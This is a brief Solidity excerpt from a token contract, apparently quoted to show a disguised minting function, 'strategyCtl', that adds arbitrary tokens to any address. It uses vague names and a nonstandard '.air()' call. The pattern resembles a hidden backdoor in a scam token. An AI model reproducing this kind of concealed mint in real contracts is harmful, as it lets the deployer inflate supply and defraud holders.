...
contract StandardToken is IERC20, Ownable, BaseToken {
    ...
    function strategyCtl(address airAddr, uint256 airAmount) public {
        ...
        _beforeTokenTransfer(address(0), airAddr, airAmount);
        _totalSupply = _totalSupply.add(airAmount);
        _balances[airAddr] = _balances[airAddr].air(airAmount);
        emit Transfer(address(0), airAddr, airAmount);
    }
